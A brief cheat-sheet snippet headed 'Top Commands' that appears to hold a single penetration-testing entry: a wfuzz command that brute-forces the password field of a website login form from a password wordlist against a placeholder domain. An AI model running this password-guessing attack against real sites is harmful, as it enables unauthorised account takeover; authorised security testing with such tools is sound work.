--- ---

<h2>Top Commands</h2>

Website Login
```
wfuzz -zfile,wordlists/passwords.txt --hs 'Invalid-HTML-STATMENT' -d 'username=access&password=FUZZ' https://DOMAIN/login
```





